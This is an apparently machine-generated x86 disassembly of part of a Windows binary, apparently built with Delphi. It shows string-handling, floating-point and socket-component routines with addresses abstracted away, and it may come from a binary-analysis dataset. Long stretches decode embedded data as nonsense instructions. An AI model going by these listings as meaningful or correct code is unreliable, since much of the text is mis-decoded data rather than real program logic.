mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_40471c
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404638
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_40416c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_4043d8
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404638
jmp r-xdata
mov eax ebx
call sub_404118
jmp r-xdata
sub_4742ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
test ebx ebx
js r-xdata
mov edx esp
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404cf4
xor eax eax
push ebp
push sub_474386
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0xc ]
test esi esi
jl r-xdata
mov esi [ edx + ebx * 4 ]
dec ebx
push esi
jns r-xdata
or edi 0xffffffff
inc esi
xor edi edi
mov ebx [ ebp - 0x8 ]
mov edx [ ebx ]
mov eax [ ebp - 0x4 ]
call sub_408248
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404524
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47438d
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
inc ecx
mov edx [ r-xdata ]
call sub_404bb4
retn
inc edi
add ebx 0x4
dec esi
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_4743a0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47442b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_408064
mov eax [ ebp - 0x4 ]
push eax
mov eax r-xdata
mov [ ebp - 0x20 ] eax
mov eax r-xdata
mov [ ebp - 0x1c ] eax
mov eax r-xdata
mov [ ebp - 0x18 ] eax
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov eax r-xdata
mov [ ebp - 0xc ] eax
mov eax r-xdata
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x6
pop eax
call sub_4742ec
inc eax
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474432
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_474490
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_474543
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_408064
mov eax [ ebp - 0x4 ]
push eax
mov eax r-xdata
mov [ ebp - 0x34 ] eax
mov eax r-xdata
mov [ ebp - 0x30 ] eax
mov eax r-xdata
mov [ ebp - 0x2c ] eax
mov eax r-xdata
mov [ ebp - 0x28 ] eax
mov eax r-xdata
mov [ ebp - 0x24 ] eax
mov eax r-xdata
mov [ ebp - 0x20 ] eax
mov eax r-xdata
mov [ ebp - 0x1c ] eax
mov eax r-xdata
mov [ ebp - 0x18 ] eax
mov eax r-xdata
mov [ ebp - 0x14 ] eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov eax r-xdata
mov [ ebp - 0xc ] eax
mov eax r-xdata
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x34 ]
mov ecx 0xb
pop eax
call sub_4742ec
inc eax
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47454a
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4745e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx edx
mov edx eax
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
test al dl
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x6 ]
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x2 ]
call sub_409b90
push ebx
movzx eax [ ebp - 0x2 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
movzx eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409280
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
mov eax ebx
mov edx r-xdata
call sub_40416c
jmp r-xdata
mov eax ebx
call j_sub_4045e4
mov [ eax ] 0x2b
mov eax ebx
call j_sub_4045e4
mov [ eax ] 0x2d
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4746a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4747c0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_408280
mov eax [ ebp - 0x14 ]
mov ecx 0x5
mov edx 0x1
call sub_404638
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4747c7
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x2b
je r-xdata
xor eax eax
push ebp
push j_sub_4037e4#3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x18 ]
push eax
mov ecx 0x2
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x18 ]
call sub_408648
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x2
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_404638
mov eax [ ebp - 0x1c ]
call sub_408648
xor ecx ecx
pop edx
call sub_409b50
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x2d
jne r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
fld [ ebp - 0x10 ]
fchs
fstp [ ebp - 0x10 ]
fwait
sub_4747d4
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_47486a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4738f8
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp - 0x4 ]
call sub_4043d8
cmp eax 0x5
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4746a0
fstp [ ebp - 0x18 ]
fwait
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
fld [ ebp - 0x10 ]
fsub [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
fld [ ebp - 0x18 ]
fabs
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
call sub_47402c
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x10 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474871
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4748a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax esi
call sub_4043d8
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov bl [ eax ]
inc eax
mov [ esp + 0x8 ] eax
mov esi [ esp ]
mov ebp edi
dec ebp
mov edi [ esp + 0x4 ]
sub edi ebp
test ebp ebp
jne r-xdata
test edi edi
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
cmp bl [ esi ]
jne r-xdata
cmp bl [ esi ]
jne r-xdata
inc esi
inc esi
mov ecx ebp
mov edx [ esp + 0x8 ]
mov eax esi
call sub_40810c
test al al
je r-xdata
inc esi
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
inc eax
jmp r-xdata
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
jmp r-xdata
jmp r-xdata
sub_474948
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4749fb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474a02
retn
mov eax rw-data
call sub_40d814
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
call sub_404118
mov eax rw-data
mov edx [ r-xdata ]
call sub_405400
mov eax rw-data
mov edx [ r-xdata ]
call sub_405400
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404bb4
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404bb4
sub_474a04
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_474ad7
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474ade
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea eax [ ebp - 0x4 ]
call sub_473ee0
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40416c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402e48
jne r-xdata
mov eax sub_40ca64
mov [ rw-data ] eax
mov [ rw-data ] sub_474898
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40416c
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4053f4
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40416c
sub_474c24
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x474c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c00474c ] ah
add [ eax ] al
add [ ebx + ecx * 2 ] ah
inc edi
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esi + ecx * 2 ] bh
inc edi
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax - 0x13ffb8b3 ] cl
sub al [ eax ]
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
int 0xe8
clc
dec [ ebx + 0x33f08bda ]
rcl [ ebp + 0x68 ] 0x17
dec esi
inc edi
add [ edi + edi * 8 + 0x30 ] ah
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474e1e
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_421a7c
test [ esi + 0x1c ] 0x10
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
mov eax 0x700474c
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
push ebp
push sub_474e17
push [ fs : eax ]
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
int3
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
call sub_403668
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
insb
dec esp
inc edi
add [ ebx + ecx * 2 + 0x60047 ] dh
adc [ ecx + 0x64 ] cl
inc ecx
outsb
je r-xdata
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
inc [ ecx ]
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
sub_474e3c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421ac8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_474e68
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_474eac
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_474eac
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_474884
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_474ed4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474ef9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474f00
retn
sub_475220
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421a7c
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_475292
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_403668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475299
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_471df4
mov edx [ rw-data ]
mov [ edx ] eax
sub_4752b8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4036d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_421ac8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_47531f
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475326
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d814
sub_475344
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4753ef
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4753f6
lea eax [ ebp - 0x10 ]
call sub_404118
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_409280
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_409280
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_475400
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_475438
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_475468
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_475498
or [ eax ] eax
add [ eax ] al
rcl [ ebp + 0x49 ] 0x1
add [ eax ] ch
pop esi
dec ecx
add ah cl
push ebp
dec ecx
add [ eax ] ch
pop esi
dec ecx
add al cl
push ebp
dec ecx
add [ eax ] ch
pop esi
dec ecx
add ah al
push ebp
dec ecx
add [ eax ] ch
pop esi
dec ecx
add al al
push ebp
dec ecx
add [ eax - 0x43ffb6a2 ] dl
push ebp
dec ecx
add al al
pushad
dec ecx
add [ eax - 0x63ffb6ab ] bh
pop esp
dec ecx
add [ ebp + edx * 2 + 0x5f200049 ] dh
dec ecx
add [ eax + 0x38004955 ] dh
pop ebp
dec ecx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_475520
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475527
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404bb4
sub_475561
push ebp
inc edi
add ah bh
push ebp
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
push ebp
inc edi
add [ eax + eax ] ch
add [ eax ] al
and [ esi + 0x41 ] ah
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah ch
pop eax
inc edi
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add [ eax - 0xfffb8a4 ] ch
xchg esi eax
inc ecx
add al dl
xchg edi eax
inc ecx
add [ eax ] al
cwde
inc ecx
add al bh
xchg edi eax
inc ecx
add [ ebx + ebx * 2 ] cl
inc edi
add [ eax - 0x4bffb8a8 ] al
pop eax
inc edi
add [ ecx + ebx * 2 + 0xe0047 ] ah
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
cld
push ebp
inc edi
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] ch
popad
outsb
insb
mov al [ gs : 0xffffffffac004755 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edi
inc edi
add [ edi + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push edi
inc edi
add [ eax ] al
[ eax ]
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ 0x65696c43 ] cl
outsb
je r-xdata
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x47 ] dl
outsd
jb r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
xlat
add al 0x0
add [ ecx + rw-data ] ah
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
xor [ eax + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
pop eax
inc edi
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] bl
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x43644945 ] dl
outsd
jne r-xdata
popad
outsb
insb
inc ebp
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x6f536449 ] dl
xor eax 0x35600040
dec ebp
popad
js r-xdata
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
xor eax 0x355c0040
inc eax
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
ror al 0x57
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
push edi
inc edi
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
outsd
jb r-xdata
inc cx
add [ eax + eax ] al
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov al [ 0xffffffffac004755 ]
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_471d08
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl 0x1
mov eax ebx
call sub_475d3c
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov ah 0x56
inc edi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
inc eax
add [ edi + edx * 2 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
